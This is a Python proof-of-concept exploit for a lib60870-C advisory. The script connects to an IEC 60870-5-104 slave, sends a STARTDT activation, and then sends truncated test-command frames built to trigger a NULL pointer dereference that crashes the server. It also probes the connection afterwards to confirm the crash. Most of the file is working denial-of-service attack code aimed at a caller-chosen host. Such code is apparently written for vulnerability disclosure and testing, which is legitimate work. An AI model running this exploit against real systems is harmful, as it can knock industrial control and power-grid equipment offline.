#!/usr/bin/env python3
"""
PoC for GHSA-75pr-rr3v-j6px (CWE-690/476) - lib60870-C CS104 slave
NULL pointer dereference in the test-command handler.

Confirmed vulnerable at tag v2.3.5 (fixed v2.3.6 / commit 0c5487f):
  src/iec60870/cs104/cs104_slave.c :: handleASDU(), case C_TS_TA_1 (107).

The slave calls CS101_ASDU_getElementEx() to decode the test command and
then dereferences the returned pointer (InformationObject_getObjectAddress)
WITHOUT a NULL check. A truncated C_TS_TA_1 ASDU (payload < 9 bytes) makes
TestCommandWithCP56Time2a_getFromBuffer() return NULL via its
"minSize > msgSize" path -> NULL deref -> SIGSEGV.

The vulnerable deref is inside the "cot != ACTIVATION" branch, so we send
the test command with a non-activation COT.

Wire format
-----------
APCI (6 bytes): 68 LEN  CTRL0 CTRL1 CTRL2 CTRL3
  - 68         : start byte
  - LEN        : number of bytes that follow (control field + ASDU)
  - I-frame control field has bit0 = 0 (send/recv seq numbers)
ASDU (CS104 defaults: COT=2 bytes, CA=2 bytes, IOA=3 bytes):
  TypeID  VSQ  COT_lo COT_hi(OA)  CA_lo CA_hi  [ payload... ]
  header = TypeID(1)+VSQ(1)+COT(2)+CA(2) = 6 bytes -> payloadSize = len-6

We truncate so payloadSize is 0..8 (< 9) -> getElementEx returns NULL.
"""

import socket
import struct
import sys
import time

C_TS_NA_1 = 0x68  # 104 - test command (no time); gated off by default in CS104
C_TS_TA_1 = 0x6B  # 107 - test command with CP56Time2a; the reachable bug

COT_SPONTANEOUS = 3      # != activation(6) -> hits the vulnerable branch
COT_ACTIVATION = 6


def apci_i_frame(asdu: bytes, send_seq: int = 0, recv_seq: int = 0) -> bytes:
    """Wrap an ASDU in an I-format APCI."""
    ctrl = struct.pack("<HH", (send_seq << 1) & 0xFFFE, (recv_seq << 1) & 0xFFFE)
    length = len(ctrl) + len(asdu)
    return bytes([0x68, length]) + ctrl + asdu


def u_frame(ctrl0: int) -> bytes:
    """U-format APCI (STARTDT_ACT etc.)."""
    return bytes([0x68, 0x04, ctrl0, 0x00, 0x00, 0x00])


STARTDT_ACT = u_frame(0x07)  # 68 04 07 00 00 00


def test_command_asdu(type_id: int, cot: int, ca: int, payload: bytes) -> bytes:
    """
    Build a (possibly truncated) test-command ASDU.
    VSQ = 0x01 (1 element, not sequence).
    Header: TypeID, VSQ, COT_lo, OA(=COT_hi), CA_lo, CA_hi.
    """
    return bytes(
        [
            type_id,
            0x01,            # VSQ: 1 information object
            cot & 0xFF,      # COT low byte
            0x00,            # originator address (high byte of 2-byte COT)
            ca & 0xFF,       # CA low
            (ca >> 8) & 0xFF,  # CA high
        ]
    ) + payload


def recv_some(sock, label):
    sock.settimeout(2.0)
    try:
        data = sock.recv(4096)
        if data:
            print(f"    [{label}] RECV {len(data)} bytes: {data.hex(' ')}")
        else:
            print(f"    [{label}] connection closed by peer (recv returned empty)")
        return data
    except socket.timeout:
        print(f"    [{label}] (no reply within timeout)")
        return b""
    except (ConnectionResetError, OSError) as e:
        print(f"    [{label}] connection error: {e}")
        return None


def attempt(host, port, type_id, cot, payload, tag):
    type_name = {C_TS_TA_1: "C_TS_TA_1(107)", C_TS_NA_1: "C_TS_NA_1(104)"}.get(
        type_id, hex(type_id)
    )
    print(f"\n[*] Attempt {tag}: {type_name} COT={cot} payload_len={len(payload)}")
    try:
        s = socket.create_connection((host, port), timeout=4.0)
    except OSError as e:
        print(f"    [!] connect failed: {e}")
        return False

    try:
        print(f"    SEND STARTDT_ACT: {STARTDT_ACT.hex(' ')}")
        s.sendall(STARTDT_ACT)
        recv_some(s, "STARTDT_CON")  # expect 68 04 0b 00 00 00

        asdu = test_command_asdu(type_id, cot, 1, payload)
        frame = apci_i_frame(asdu, send_seq=0, recv_seq=0)
        print(f"    SEND truncated test cmd I-frame: {frame.hex(' ')}")
        s.sendall(frame)

        # If the slave crashes, the socket dies (reset / empty recv).
        r = recv_some(s, "post-trigger")
        # Probe once more to detect a dead server.
        try:
            s.sendall(STARTDT_ACT)
            r2 = recv_some(s, "probe")
        except OSError as e:
            print(f"    probe send failed (server likely dead): {e}")
            r2 = None

        crashed = (r is None) or (r == b"" and r2 in (None, b""))
        return crashed
    finally:
        try:
            s.close()
        except OSError:
            pass


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 2404

    print(f"[*] Target {host}:{port}")
    print("[*] GHSA-75pr-rr3v-j6px lib60870-C CS104 test-command NULL deref PoC")

    # Primary: C_TS_TA_1 with non-activation COT, truncated bodies (payload < 9).
    # Try several truncation lengths; payload_len 0 already triggers the bug.
    attempts = []
    for plen in (0, 1, 4, 8):
        attempts.append((C_TS_TA_1, COT_SPONTANEOUS, b"\x00" * plen))
    # Belt-and-suspenders: also try activation COT and the no-time variant.
    attempts.append((C_TS_TA_1, COT_ACTIVATION, b"\x00" * 0))
    attempts.append((C_TS_NA_1, COT_ACTIVATION, b"\x00" * 0))

    for i, (tid, cot, payload) in enumerate(attempts, 1):
        crashed = attempt(host, port, tid, cot, payload, tag=str(i))
        if crashed:
            print(f"\n[+] Server appears to have CRASHED after attempt {i} "
                  f"(TypeID={hex(tid)}, COT={cot}, payload_len={len(payload)}).")
            print("[+] Check `docker logs` for the ASan SEGV / NULL-deref report.")
            return 0
        time.sleep(0.3)

    print("\n[-] Server still responsive after all attempts - NOT crashed.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
